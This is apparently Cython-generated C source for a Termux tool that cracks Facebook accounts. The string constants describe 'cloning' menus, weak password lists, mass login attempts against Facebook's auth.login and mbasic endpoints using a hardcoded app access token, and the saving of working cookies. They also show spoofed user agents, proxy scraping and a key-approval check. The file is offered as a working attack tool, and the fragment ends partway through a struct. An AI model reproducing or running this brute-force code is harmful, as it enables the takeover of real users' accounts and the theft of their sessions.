static const char __pyx_k_38_5_244m_38_5_46m_THE_PROCESS[] = "*\033[38;5;244m]\033[38;5;46m THE PROCESS HAS COMPLETED";
static const char __pyx_k_38_5_244m_38_5_46m_TOTAL_OK_CP[] = "*\033[38;5;244m]\033[38;5;46m TOTAL OK/CP : ";
static const char __pyx_k_Not_A_Brand_v_8_0_0_0_Chromium[] = "\"Not_A Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"120.0.6099.116\"";
static const char __pyx_k_Not_A_Brand_v_8_Chromium_v_120[] = "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\"";
static const char __pyx_k_data_data_com_termux_files_usr[] = "/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/";
static const char __pyx_k_getprop_ro_product_cpu_abilist[] = "getprop ro.product.cpu.abilist";
static const char __pyx_k_1_97m_1_91m_1_92m_1_93m_38_5_46[] = "  \n\033[1;97m\342\224\217\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201 \033[1;91m>\033[1;92m>\033[1;93m>\033[38;5;46m\033[38;5;46mTOOLS TYPE\033[1;91m<\033[1;92m<\033[1;93m<\033[1;97m \342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\223\n\342\224\203     \033[38;5;46mFILE\033[1;97m\303\227\033[38;5;46mRANDOM\033[1;97m\303\227\033[38;5;46mOLD CLONING\033[1;97m (\033[1;91mFREE\033[1;97m) \033[1;91m \357\201\227  \033[1;92m\357\201\226  \033[1;93m\357\204\271     \033[1;97m\342\224\203    \nn\033[1;97m\342\224\203     \033[38;5;46mAUTHOR  \033[38;5;244m\033[38;5;46m  :\033[38;5;46m AYYUB HASAN KIRON            \033[1;97m   \342\224\203\n\033[1;97m\342\224\203     \033[38;5;46mFACEBOOK \033[38;5;244m\033[38;5;46m : https://facebook.com/4YU8.H454N\033[1;97m \342\224\203\n\033[1;97m\342\224\203     \033[38;5;46mGITHUB \033[38;5;244m\033[38;5;46m   : https://github.com/AYYUB-XD\033[1;97m     \342\224\203\n\033[1;97m\342\224\203     \033[38;5;46mVERSION \033[38;5;244m\033[38;5;46m  : 0.01                        \033[1;97m    \342\224\203\n\033[1;97mn\342\224\217\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201 \033[1;91m>\033[1;92m>\033[1;93m>\033[38;5;46m\033[38;5;46mYOUR KEY\033[1;91m<\033[1;92m<\033[1;93m<\033[1;97m \342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\223\n\342\224\203            \033[38;5;46m";
static const char __pyx_k_1_97m_38_5_244m_1_97m_38_5_244m[] = "\033[1;97m\033[38;5;244m[\033[1;97m*\033[38;5;244m]\033[38;5;46m YOUR KEY IS NOT APPROVED ";
static const char __pyx_k_38_5_244m_1_97m0_38_5_244m_38_5[] = "\033[38;5;244m[\033[1;97m0\033[38;5;244m]\033[38;5;46m \033[91;1mBACK MENU";
static const char __pyx_k_38_5_244m_1_97m1_38_5_244m_38_5[] = "\033[38;5;244m[\033[1;97m1\033[38;5;244m] \033[38;5;46mMETHOD \033[38;5;244m[\033[38;5;46m2009-2014\033[38;5;244m] \033[38;5;46m";
static const char __pyx_k_38_5_244m_38_5_244m_38_5_46m_38[] = "\033[38;5;244m]\033[38;5;244m\342\200\223\033[38;5;46m\033[38;5;244m[\033[38;5;46m";
static const char __pyx_k_38_5_244m_38_5_46mAYYUB_38_5_24[] = "\r\033[38;5;244m[\033[38;5;46mAYYUB-\360\237\222\232\033[38;5;244m]\033[38;5;46m ";
static const char __pyx_k_38_5_244m_38_5_46mAYYUB_OK_38_5[] = "\r\033[38;5;244m[\033[38;5;46mAYYUB-OK\033[38;5;244m]\033[38;5;46m ";
static const char __pyx_k_38_5_244m_38_5_46mAYYUB_XD_38_5[] = "\r\033[38;5;244m[\033[38;5;46mAYYUB-XD\033[38;5;244m] \033[38;5;244m[\033[38;5;81m";
static const char __pyx_k_38_5_244m_38_5_46mOK_1_37m_38_5[] = "\033[38;5;244m] \033[38;5;46mOK\033[1;37m|\033[38;5;46m";
static const char __pyx_k_38_5_244m_38_5_46m_38_5_244m_38[] = "\033[38;5;244m]\033[38;5;46m \033[38;5;244m[\033[38;5;46m%s\033[38;5;244m]\033[38;5;46m \033[38;5;244m[\033[38;5;46m%s\033[38;5;244m|\033[1;91m%s\033[38;5;244m] ";
static const char __pyx_k_38_5_244m_38_5_46m_EXAMPLE_sdca[] = "*\033[38;5;244m]\033[38;5;46m EXAMPLE : /sdcard/XX.txt ";
static const char __pyx_k_38_5_244m_38_5_46m_FILE_LOCATIO[] = "*\033[38;5;244m]\033[38;5;46m FILE LOCATION NOT FOUND ";
static const char __pyx_k_38_5_244m_38_5_46m_IF_NO_RESULT[] = "*\033[38;5;244m]\033[38;5;46m IF NO RESULT \033[38;5;244m[\033[38;5;46mON\033[38;5;244m/\033[38;5;46mOFF\033[38;5;244m]\033[38;5;46m AIRPLANE MODE";
static const char __pyx_k_38_5_244m_38_5_46m_OPTION_NOT_F[] = "*\033[38;5;244m]\033[38;5;46m OPTION NOT FOUND IN MENU...";
static const char __pyx_k_38_5_244m_38_5_46m_PASSWORD_LIM[] = "*\033[38;5;244m]\033[38;5;46m PASSWORD LIMIT : ";
static const char __pyx_k_38_5_244m_38_5_46m_PASS_38_5_24[] = "*\033[38;5;244m]\033[38;5;46m PASS \033[38;5;244m\342\200\223\033[38;5;46m";
static const char __pyx_k_38_5_244m_38_5_46m_TOTAL_ACCOUN[] = "*\033[38;5;244m]\033[38;5;46m TOTAL ACCOUNT \033[38;5;244m\342\200\223\033[38;5;46m";
static const char __pyx_k_AppleWebKit_534_30_KHTML_like_G[] = ") AppleWebKit/534.30 (KHTML, like Gecko) Version/";
static const char __pyx_k_AppleWebKit_537_36_KHTML_like_G[] = ") AppleWebKit/537.36 (KHTML, like Gecko) ";
static const char __pyx_k_FBAN_FB4A_FBAV_59_0_0_15_313_FB[] = ";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M1803E1A;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]";
static const char __pyx_k_FBDM_density_2_625_width_1080_h[] = ";FBDM/{density=2.625,width=1080,height=1920};FBLC/";
static const char __pyx_k_KHTML_like_Gecko_UCBrowser_79_0[] = "(KHTML, like Gecko) UCBrowser/79.0.";
static const char __pyx_k_Mobile_Safari_537_36_XiaoMi_Miu[] = " Mobile Safari/537.36 XiaoMi/MiuiBrowser/18.0.";
static const char __pyx_k_Mozilla_5_0_Macintosh_Intel_Mac[] = "Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/";
static const char __pyx_k_SA_str_rr_1_9_Mobile_Safari_str[] = " SA/{str(rr(1,9))} Mobile Safari/{str(rr(511,599))}.{str(rr(30,39))}";
static const char __pyx_k_credentials_type_device_based_l[] = "&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20\302\244tly_logged_in_userid=0&method=GET&locale=en_GB&client_country_code=GB&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true";
static const char __pyx_k_getprop_ro_product_manufacturer[] = "getprop ro.product.manufacturer";
static const char __pyx_k_https_fgsrsvb_blogspot_com_2024[] = "https://fgsrsvb.blogspot.com/2024/05/approvetxt.html";
static const char __pyx_k_https_graph_facebook_com_method[] = "https://graph.facebook.com/method/auth.login";
static const char __pyx_k_https_mbasic_facebook_com_login[] = "https://mbasic.facebook.com/login/device-based/regular/login/?refsrc";
static const char __pyx_k_https_raw_githubusercontent_com[] = "https://raw.githubusercontent.com/SHISHIR-143/R/main/mix.txt";
static const char __pyx_k_sdcard_AYYUB_RND_M1_OK_COKIE_tx[] = "/sdcard/AYYUB/RND-M1-OK-COKIE.txt";
static const char __pyx_k_text_html_application_xhtml_xml[] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
static const char __pyx_k_xdg_open_https_www_facebook_com[] = "xdg-open https://www.facebook.com/4YU8.H454N?mibextid=ZbWKwL";
static const char __pyx_k_1_38_5_244m_38_5_46m_FILE_CLONIN[] = "1\033[38;5;244m]\033[38;5;46m FILE CLONING \n\033[38;5;244m[";
static const char __pyx_k_1_38_5_244m_38_5_46m_METHOD_38_5[] = "1\033[38;5;244m]\033[38;5;46m METHOD \033[38;5;244m[";
static const char __pyx_k_2_38_5_244m_38_5_46m_METHOD_38_5[] = "2\033[38;5;244m]\033[38;5;46m METHOD \033[38;5;244m[";
static const char __pyx_k_2_38_5_244m_38_5_46m_RANDOM_CLON[] = "2\033[38;5;244m]\033[38;5;46m RANDOM CLONING\n\033[38;5;244m[";
static const char __pyx_k_350685531728_62f8ce9f74b12f84c12[] = "350685531728|62f8ce9f74b12f84c123cc23437a4a32";
static const char __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_2[] = "\033[38;5;244m[\033[1;97m*\033[38;5;244m]\033[38;5;46m \033[38;5;46mEXAMPLE : \033[38;5;46m3000\033[38;5;244m/\033[38;5;46m5000\033[38;5;244m/\033[38;5;46m10000\033[38;5;244m/\033[38;5;46m99999";
static const char __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_3[] = "\033[38;5;244m[\033[1;97m*\033[38;5;244m]\033[38;5;46m \033[38;5;46mINPUT : ";
static const char __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_4[] = "\033[38;5;244m[\033[1;97m*\033[38;5;244m]\033[38;5;46m\033[38;5;46m TOTAL ID \033[38;5;244m\342\200\223\033[38;5;46m";
static const char __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_5[] = "\033[38;5;244m[\033[1;97m*\033[38;5;244m]\033[38;5;46m\033[38;5;46m METHOD \033[38;5;244m  \342\200\223\033[38;5;46m ";
static const char __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_6[] = "\033[38;5;244m[\033[1;97m*\033[38;5;244m]\033[38;5;46m IF NO RESULT \033[38;5;244m[\033[38;5;46mON\033[38;5;244m/\033[38;5;46mOFF\033[38;5;244m]\033[38;5;46m AIRPLANE MODE";
static const char __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_7[] = "\033[38;5;244m[\033[1;97m*\033[38;5;244m] \033[38;5;46mEXAMPLE \033[1;97m\342\227\217 \033[38;5;46mfirst last \033[38;5;244m|\033[38;5;46m first123";
static const char __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_8[] = "\033[38;5;244m[\033[1;97m*\033[38;5;244m] \033[38;5;46mEXAMPLE \033[1;97m\342\227\217 \033[38;5;46m57273200 59039200 57575751 ";
static const char __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_9[] = "\033[38;5;244m[\033[1;97m*\033[38;5;244m] \033[38;5;46m CHOICE :\033[38;5;46m ";
static const char __pyx_k_3_38_5_244m_38_5_46m_OLD_CLONING[] = "3\033[38;5;244m]\033[38;5;46m OLD CLONING\n\033[38;5;244m[";
static const char __pyx_k_Mozilla_5_0_Linux_U_Android_10_e[] = "Mozilla/5.0 (Linux; U; Android 10; en-us; ";
static const char __pyx_k_Mozilla_5_0_Linux_U_Android_13_p[] = "Mozilla/5.0 (Linux; U; Android 13; pt-pt; ";
static const char __pyx_k_Mozilla_5_0_Linux_arm_64_Android[] = "Mozilla/5.0 (Linux; arm_64; Android 10; ";
static const char __pyx_k_Mozilla_5_0_Windows_NT_10_0_Win6[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.";
static const char __pyx_k_Mozilla_5_0_Windows_U_Windows_NT[] = "Mozilla/5.0 (Windows; U; Windows NT ";
static const char __pyx_k_Mozilla_5_0_X11_Linux_x86_64_And[] = "Mozilla/5.0 (X11; Linux x86_64; Android ";
static const char __pyx_k_Profile_MIDP_2_1_Configuration_C[] = "Profile/MIDP-2.1 Configuration/CLDC-1.1UNTRUSTED/2.0";
static const char __pyx_k_application_x_www_form_urlencode[] = "application/x-www-form-urlencoded";
static const char __pyx_k_cell_CTRadioAccessTechnologyHSDP[] = "cell.CTRadioAccessTechnologyHSDPA";
static const char __pyx_k_com_facebook_account_login_proto[] = "com.facebook.account.login.protocol.Fb4aAuthHandler";
static const char __pyx_k_en_BD_en_GB_q_0_9_en_US_q_0_8_en[] = "en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7";
static const char __pyx_k_getprop_ro_build_version_release[] = "getprop ro.build.version.release";
static const char __pyx_k_getprop_ro_hwui_text_large_cache[] = "getprop ro.hwui.text_large_cache_height";
static const char __pyx_k_https_api_facebook_com_method_au[] = "https://api.facebook.com/method/auth.login?format=json&email=";
static const char __pyx_k_https_api_proxyscrape_com_reques[] = "https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all";
static const char __pyx_k_https_api_proxyscrape_com_v2_req[] = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all";
static const char __pyx_k_https_graph_facebook_com_auth_lo[] = "https://graph.facebook.com/auth/login";
static const char __pyx_k_pip_install_requests_futures_2_d[] = "pip install requests futures==2 > /dev/null";
static const char __pyx_k_xdg_open_https_wa_me_88019097655[] = "xdg-open https://wa.me/+8801909765573";
static const char __pyx_k_38_5_244m_1_97m1_38_5_244m_38_5_2[] = "\033[38;5;244m[\033[1;97m1\033[38;5;244m]\033[38;5;46m BD RANDOM CLONE";
static const char __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_10[] = "\033[38;5;244m[\033[1;97m*\033[38;5;244m] \033[38;5;46m EXAMPLE :\033[38;5;46m 01768 - 01831 - 01945 - 01634";
static const char __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_11[] = "\033[38;5;244m[\033[1;97m*\033[38;5;244m] \033[38;5;46m CHOICE CODE :";
static const char __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_12[] = "\033[38;5;244m[\033[1;97m*\033[38;5;244m] \033[38;5;46m EXAMPLE :\033[38;5;46m 2000, 3000, 5000, 10000";
static const char __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_13[] = "\033[38;5;244m[\033[1;97m*\033[38;5;244m] \033[38;5;46m CRAKING LIMITE :";
static const char __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_14[] = "\033[38;5;244m[\033[1;97m*\033[38;5;244m] \033[38;5;46mTOTAL UID \033[38;5;244m\342\200\223\033[38;5;46m\033[1;37m ";
static const char __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_15[] = "\033[38;5;244m[\033[1;97m*\033[38;5;244m] \033[38;5;46mSIM CODE  \033[38;5;244m\342\200\223\033[38;5;46m\033[1;37m ";
static const char __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_16[] = "\033[38;5;244m[\033[1;97m*\033[38;5;244m] \033[38;5;46mIF NO RESULT \033[38;5;244m[\033[38;5;46mON\033[38;5;244m/\033[38;5;46mOFF\033[38;5;244m]\033[38;5;46m AIRPLANE MODE ";
static const char __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_17[] = "\033[38;5;244m[\033[1;97m*\033[38;5;244m] \033[38;5;46m CRACK SUCCESSFULLY COMPLETED..";
static const char __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_18[] = "\033[38;5;244m[\033[1;97m*\033[38;5;244m] \033[38;5;46m TOTAL \033[38;5;46mOK \033[1;37m :  \033[38;5;46m";
static const char __pyx_k_38_5_244m_1_97m_38_5_244m_38_5_19[] = "\033[38;5;244m[\033[1;97m*\033[38;5;244m] \033[38;5;46m server error";
static const char __pyx_k_38_5_244m_38_5_244m_38_5_46m_38_2[] = "\033[38;5;244m]\033[38;5;244m-\033[38;5;46m\033[38;5;244m[\033[38;5;46m";
static const char __pyx_k_38_5_244m_38_5_46mAYYUB_OK_38_5_2[] = "\r\r\033[38;5;244m[\033[38;5;46mAYYUB-OK\033[38;5;244m]\033[38;5;46m ";
static const char __pyx_k_38_5_244m_38_5_46m_38_5_244m_38_2[] = "\033[38;5;244m[\033[38;5;46m\342\227\217\033[38;5;244m]\033[38;5;46m DO NOT TRY TO FUCK YOUR MOM...";
static const char __pyx_k_38_5_244m_38_5_46m_38_5_244m_38_3[] = "\033[38;5;244m[\033[38;5;46m\342\227\217\033[38;5;244m]\033[38;5;46m CHECKING UPDATE......";
static const char __pyx_k_38_5_244m_38_5_46m_38_5_244m_38_4[] = "\033[38;5;244m[\033[38;5;46m\342\227\217\033[38;5;244m]\033[38;5;46m YOUR DEVICE 64 BET";
static const char __pyx_k_AppleWebKit_537_36_KHTML_like_G_2[] = ") AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/";
static const char __pyx_k_AppleWebKit_537_36_KHTML_like_G_3[] = ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/";
static const char __pyx_k_FBAN_FB4A_FBAV_59_0_0_15_313_FB_2[] = ";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ZS630KL;FBSV/9;nullFBCA/armeabi-v7a:armeabi;]";
static const char __pyx_k_getprop_ro_hwui_text_large_cache_2[] = "getprop ro.hwui.text_large_cache_width";
/* #### Code section: decls ### */
static PyObject *__pyx_pf_5kiron_clear(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_5kiron_2clear(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_5kiron_4linex(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_5kiron_6AYYUB_M1(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_5kiron_8AYYUB_M2(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_5kiron_10windows(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_5kiron_12approval(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_5kiron_14_old_(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_5kiron_16login(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_uid); /* proto */
static PyObject *__pyx_pf_5kiron_18menu(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_5kiron_20usergent(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_5kiron_22rnd(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_5kiron_2BD_genexpr(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_5kiron_24BD(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_5kiron_26idpaslogin(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_uid, PyObject *__pyx_v_passlist, CYTHON_UNUSED PyObject *__pyx_v_tl); /* proto */
static PyObject *__pyx_pf_5kiron_4api1_genexpr(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_5kiron_4api1_3genexpr(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_genexpr_arg_0); /* proto */
static PyObject *__pyx_pf_5kiron_28api1(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_ids, PyObject *__pyx_v_names, PyObject *__pyx_v_passlist); /* proto */
static PyObject *__pyx_pf_5kiron_4api2_genexpr(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_5kiron_4api2_3genexpr(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_genexpr_arg_0); /* proto */
static PyObject *__pyx_pf_5kiron_30api2(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_ids, PyObject *__pyx_v_names, PyObject *__pyx_v_passlist); /* proto */
static PyObject *__pyx_tp_new_5kiron___pyx_scope_struct__genexpr(PyTypeObject *t, PyObject *a, PyObject *k); /*proto*/
static PyObject *__pyx_tp_new_5kiron___pyx_scope_struct_1_genexpr(PyTypeObject *t, PyObject *a, PyObject *k); /*proto*/
static PyObject *__pyx_tp_new_5kiron___pyx_scope_struct_2_genexpr(PyTypeObject *t, PyObject *a, PyObject *k); /*proto*/
static PyObject *__pyx_tp_new_5kiron___pyx_scope_struct_3_genexpr(PyTypeObject *t, PyObject *a, PyObject *k); /*proto*/
static PyObject *__pyx_tp_new_5kiron___pyx_scope_struct_4_genexpr(PyTypeObject *t, PyObject *a, PyObject *k); /*proto*/
/* #### Code section: late_includes ### */
/* #### Code section: module_state ### */
typedef struct {
  PyObject *__pyx_d;
  PyObject *__pyx_b;
  PyObject *__pyx_cython_runtime;
  PyObject *__pyx_empty_tuple;
  PyObject *__pyx_empty_bytes;
  PyObject *__pyx_empty_unicode;
  #ifdef __Pyx_CyFunction_USED
  PyTypeObject *__pyx_CyFunctionType;
  #endif
  #ifdef __Pyx_FusedFunction_USED
  PyTypeObject *__pyx_FusedFunctionType;
  #endif
  #ifdef __Pyx_Generator_USED
  PyTypeObject *__pyx_GeneratorType;
  #endif
  #ifdef __Pyx_IterableCoroutine_USED
  PyTypeObject *__pyx_IterableCoroutineType;
  #endif
  #ifdef __Pyx_Coroutine_USED
  PyTypeObject *__pyx_CoroutineAwaitType;
  #endif
  #ifdef __Pyx_Coroutine_USED
  PyTypeObject *__pyx_CoroutineType;
  #endif
  #if CYTHON_USE_MODULE_STATE
  PyObject *__pyx_type_5kiron___pyx_scope_struct__genexpr;
  PyObject *__pyx_type_5kiron___pyx_scope_struct_1_genexpr;
  PyObject *__pyx_type_5kiron___pyx_scope_struct_2_genexpr;
  PyObject *__pyx_type_5kiron___pyx_scope_struct_3_genexpr;
  PyObject *__pyx_type_5kiron___pyx_scope_struct_4_genexpr;
  #endif
  PyTypeObject *__pyx_ptype_5kiron___pyx_scope_struct__genexpr;
  PyTypeObject *__pyx_ptype_5kiron___pyx_scope_struct_1_genexpr;
  PyTypeObject *__pyx_ptype_5kiron___pyx_scope_struct_2_genexpr;
  PyTypeObject *__pyx_ptype_5kiron___pyx_scope_struct_3_genexpr;
  PyTypeObject *__pyx_ptype_5kiron___pyx_scope_struct_4_genexpr;
  PyObject *__pyx_kp_s_0;
  PyObject *__pyx_kp_u_0;
  PyObject *__pyx_kp_u_00;
  PyObject *__pyx_kp_s_01;
  PyObject *__pyx_kp_u_011_en_us_AppleWebKit_537_36;
  PyObject *__pyx_kp_s_02;
  PyObject *__pyx_kp_s_03;
  PyObject *__pyx_kp_s_04;
  PyObject *__pyx_kp_s_05;
  PyObject *__pyx_kp_s_06;
  PyObject *__pyx_kp_s_07;
  PyObject *__pyx_kp_s_08;
  PyObject *__pyx_kp_s_09;
  PyObject *__pyx_kp_s_0_0;
  PyObject *__pyx_kp_u_0_0;
  PyObject *__pyx_kp_s_0_1;
  PyObject *__pyx_kp_s_0_2;
  PyObject *__pyx_kp_u_0_3;
  PyObject *__pyx_kp_u_0_38_5_244m_38_5_46m_EXIT_TOOL;
  PyObject *__pyx_kp_u_0_Safari_534;
  PyObject *__pyx_kp_u_0_Safari_537_36;
  PyObject *__pyx_kp_u_0_Win64_x64_AppleWebKit_537_36;
  PyObject *__pyx_kp_s_1;
  PyObject *__pyx_kp_s_10;
  PyObject *__pyx_kp_s_10000;
  PyObject *__pyx_kp_s_100000;
  PyObject *__pyx_kp_s_102030;
  PyObject *__pyx_kp_u_10_1_YaSearchBrowser;
  PyObject *__pyx_kp_s_11;
  PyObject *__pyx_kp_s_112233;
  PyObject *__pyx_kp_s_12;
  PyObject *__pyx_kp_s_123123;
  PyObject *__pyx_kp_s_123456;
  PyObject *__pyx_kp_s_1234567;
  PyObject *__pyx_kp_s_12345678;
  PyObject *__pyx_kp_s_123456789;
  PyObject *__pyx_kp_s_1234567890;
  PyObject *__pyx_kp_u_136_Mobile_Safari;
  PyObject *__pyx_kp_s_13_Pro;
  PyObject *__pyx_kp_u_1_0;
  PyObject *__pyx_kp_s_1_2;
  PyObject *__pyx_kp_s_1_33m;
  PyObject *__pyx_kp_s_1_34m;
  PyObject *__pyx_kp_s_1_34m_1_34m_38_5_244m_38_5_46m;
  PyObject *__pyx_kp_s_1_37m;
  PyObject *__pyx_kp_u_1_38_5_244m_38_5_46m_FILE_CLONIN;
  PyObject *__pyx_kp_u_1_38_5_244m_38_5_46m_METHOD_38_5;
  PyObject *__pyx_kp_s_1_96m;
  PyObject *__pyx_kp_s_1_97m;
  PyObject *__pyx_kp_s_1_97m_1_37m;
  PyObject *__pyx_kp_u_1_97m_1_37m;
  PyObject *__pyx_kp_u_1_97m_1_37m_2;
  PyObject *__pyx_kp_u_1_97m_1_91m_1_92m_1_93m_38_5_46;
  PyObject *__pyx_kp_u_1_97m_2;
  PyObject *__pyx_kp_s_1_97m_38_5_244m_1_97m_38_5_244m;
  PyObject *__pyx_kp_u_1_BroPP_1_0_SA_3_Mobile_Safari;
  PyObject *__pyx_kp_u_1_en_US_AppleWebKit_534;
  PyObject *__pyx_kp_s_2;
  PyObject *__pyx_kp_s_203040;
  PyObject *__pyx_kp_s_210;
  PyObject *__pyx_kp_u_25;
  PyObject *__pyx_kp_s_28;
  PyObject *__pyx_kp_s_29;
  PyObject *__pyx_kp_u_2_38_5_244m_38_5_46m_METHOD_38_5;
  PyObject *__pyx_kp_u_2_38_5_244m_38_5_46m_RANDOM_CLON;
  PyObject *__pyx_kp_s_2_AYYUB;
  PyObject *__pyx_kp_s_3;
  PyObject *__pyx_kp_s_350685531728_62f8ce9f74b12f84c12;
  PyObject *__pyx_kp_s_38_5_121m;
  PyObject *__pyx_kp_s_38_5_122m;
  PyObject *__pyx_kp_s_38_5_123m;
  PyObject *__pyx_kp_s_38_5_14m;
  PyObject *__pyx_kp_s_38_5_196m;
  PyObject *__pyx_kp_s_38_5_205m;
  PyObject *__pyx_kp_u_38_5_244m;
  PyObject *__pyx_kp_s_38_5_244m_1_97m0_38_5_244m_38_5;
  PyObject *__pyx_kp_u_38_5_244m_1_97m1_38_5_244m_38_5;
  PyObject *__pyx_kp_s_38_5_244m_1_97m1_38_5_244m_38_5_2;
  PyObject *__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5;
  PyObject *__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_10;
  PyObject *__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_11;
  PyObject *__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_12;
  PyObject *__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_13;
  PyObject *__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_14;
  PyObject *__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_15;
  PyObject *__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_16;
  PyObject *__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_17;
  PyObject *__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_18;
  PyObject *__pyx_kp_s_38_5_244m_1_97m_38_5_244m_38_5_19;
  PyObject *__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_2;
  PyObject *__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_3;
  PyObject *__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_4;
  PyObject *__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_5;
  PyObject *__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_6;
  PyObject *__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_7;
  PyObject *__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_8;
  PyObject *__pyx_kp_s_38_5_244m_1_97m_38_5_244m_38_5_9;
  PyObject *__pyx_kp_u_38_5_244m_2;
  PyObject *__pyx_kp_u_38_5_244m_3;
  PyObject *__pyx_kp_u_38_5_244m_38_5_244mAYYUB_OK_38;
  PyObject *__pyx_kp_u_38_5_244m_38_5_244m_38_5_46m_38;
  PyObject *__pyx_kp_u_38_5_244m_38_5_244m_38_5_46m_38_2;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46m;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46mAYYUB_38_5_24;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46mAYYUB_OK_38_5;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46mAYYUB_OK_38_5_2;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46mAYYUB_XD_38_5;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46mOK_1_37m_38_5;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46m_2;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46m_3;
